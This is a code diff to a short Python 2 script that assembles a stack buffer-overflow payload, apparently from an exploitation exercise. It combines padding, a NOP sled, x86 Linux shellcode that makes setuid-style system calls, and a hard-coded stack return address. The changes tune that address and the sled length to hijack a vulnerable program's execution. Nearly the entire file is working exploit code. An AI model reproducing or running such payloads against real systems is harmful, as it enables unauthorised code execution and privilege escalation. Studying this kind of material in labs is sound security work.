@@ -4,9 +4,11 @@ from unittest import result
 
 args = "a a" 
 padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppTTTT"
-hexString = "0x2cfbffbf"[2:]
-stackAdr = hexString.decode("hex")
-nop = "\x90"*20
+hexString = "0x20fcffbf"[2:]
+#stackAdr = hexString.decode("hex")
+#stackAdr = "\xbf\xff\xfb\x8d"
+stackAdr = "\x9c\xfa\xff\xbf"
+#nop = "\x90"*20
 
 shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
@@ -20,8 +22,9 @@ shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
 
 #result = padding + stackAdr + nop + shellcode + " " + args 
 
-result = args + " " + "\x90"*173 + shellcode + stackAdr
+result = args + " " + "\x90"*181 + shellcode + stackAdr #"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 
+#result = args + " " + "a"*(75+181) + "TTTT"
 
 print(len(padding)-len(result))
 print(result)
